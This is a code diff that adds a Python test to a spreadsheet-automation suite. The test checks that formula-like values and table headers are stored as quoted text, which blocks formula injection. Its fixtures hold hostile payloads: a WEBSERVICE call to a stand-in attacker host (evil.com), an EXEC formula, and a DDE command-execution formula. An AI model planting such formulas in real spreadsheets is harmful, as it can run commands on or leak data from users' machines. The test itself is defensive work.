@@ -763,6 +763,68 @@ def test_folder_mode_writes_formulas_formats_and_clears_ranges(
     assert result.verification.unverifiedActions == []
 
 
+def test_folder_mode_quotes_formula_like_values_to_prevent_injection(
+    tmp_path: Path,
+) -> None:
+    source = tmp_path / "scores.xlsx"
+    _create_source(source)
+    catalog = scan_folder(tmp_path)
+    snapshot = create_folder_snapshot(
+        FolderSnapshotRequest(
+            sessionId=catalog.sessionId,
+            selections=[
+                FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])
+            ],
+        )
+    )
+    target = snapshot.worksheets[0].name
+    plan = AnalysisPlan.model_validate(
+        {
+            "id": "inject-guard",
+            "title": "防公式注入",
+            "summary": "值路径的 = 开头字符串应按文本存储",
+            "actions": [
+                {
+                    "type": "writeValues",
+                    "sheet": target,
+                    "range": "B2",
+                    "values": [[r'=WEBSERVICE("http://evil.com")']],
+                },
+                {
+                    "type": "writeTable",
+                    "sheet": target,
+                    "startCell": "D1",
+                    "headers": [r"=EXEC('calc')"],
+                    "rows": [[r"=cmd|'/c calc'!A0"]],
+                },
+            ],
+        }
+    )
+
+    result = execute_folder_plan(
+        FolderExecuteRequest(
+            sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
+        )
+    )
+
+    updated = load_workbook(source, data_only=False)
+    ws = updated["得分"]
+    b2 = ws["B2"]
+    d1 = ws["D1"]
+    d2 = ws["D2"]
+    # 值路径注入被强制为文本：data_type 是字符串而非公式，且带前导撇号。
+    assert b2.data_type == "s"
+    assert b2.value == '\'=WEBSERVICE("http://evil.com")'
+    assert d1.data_type == "s"
+    assert d1.value == "'=EXEC('calc')"
+    assert d2.data_type == "s"
+    assert d2.value == "'=cmd|'/c calc'!A0"
+    updated.close()
+    assert result.verification.status == "verified"
+    assert result.verification.passed is True
+    assert result.verification.unverifiedActions == []
+
+
 def test_folder_verifies_formats_validation_and_freeze_panes(
     tmp_path: Path,
 ) -> None:
